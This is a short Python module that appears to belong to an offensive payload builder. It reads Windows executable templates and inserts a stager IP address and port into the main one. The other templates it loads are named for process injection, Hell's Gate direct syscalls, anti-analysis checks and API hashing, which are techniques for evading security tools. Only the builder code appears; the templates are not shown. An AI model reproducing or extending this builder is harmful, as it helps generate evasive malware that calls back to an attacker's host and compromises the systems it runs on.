
import os

TEMPLATE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "..", "templates"))

def _read_template(fname):
	path = os.path.join(TEMPLATE_DIR, fname)
	try:
		with open(path, "r") as f:
			return f.read()
	except FileNotFoundError:
		print(f"[!] Template not found: {path}")
		return ""

def build_main(stager_ip, stager_port):
	MAIN_C = _read_template("windows_exe_main.c")
	MAIN_C = MAIN_C.replace("{{STAGER_IP}}", stager_ip)
	MAIN_C = MAIN_C.replace("{{STAGER_PORT}}", str(stager_port))
	return MAIN_C

INJECT_C = _read_template("windows_exe_inject.c")
WINAPI_C = _read_template("windows_exe_winapi.c")
HELLSGATE_C = _read_template("windows_exe_hellsgate.c")
HELLASM_ASM = _read_template("windows_exe_hellasm.asm")
ANTIANALYSIS_C = _read_template("windows_exe_antianalysis.c")
APIHASHING_C = _read_template("windows_exe_apihashing.c")
